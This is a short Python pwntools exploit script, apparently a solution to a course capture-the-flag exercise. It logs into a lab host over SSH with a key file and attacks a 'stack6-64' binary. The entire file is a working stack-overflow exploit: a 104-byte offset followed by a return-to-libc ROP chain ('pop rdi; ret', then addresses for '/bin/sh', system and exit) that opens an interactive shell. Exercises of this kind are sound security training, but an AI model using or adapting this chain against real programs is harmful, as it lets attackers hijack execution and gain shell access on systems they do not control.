#!/usr/bin/python
from pwn import *

context.clear(arch='amd64', log_level='debug')
s = ssh('jjcabral', 'cs4401shell.walls.ninja', keyfile='jjcabral_ssh_key')
s.set_working_directory('/problems/stack6r-64_1_5f8c90e2d379cbaa325743adcf597325/')
p = s.process('./stack6-64')

    
offset = 104
ret_addr = 0x4004ce
rop_addr = 0x4006f3 #pop rdi; ret;
system_addr = 0x7ffff7a31420
exit_addr =  0x7ffff7a25110
shell_addr = 0x7ffff7b95d88

payload = flat({offset:rop_addr}, shell_addr, ret_addr, system_addr, exit_addr)

p.sendline(payload) 
p.interactive()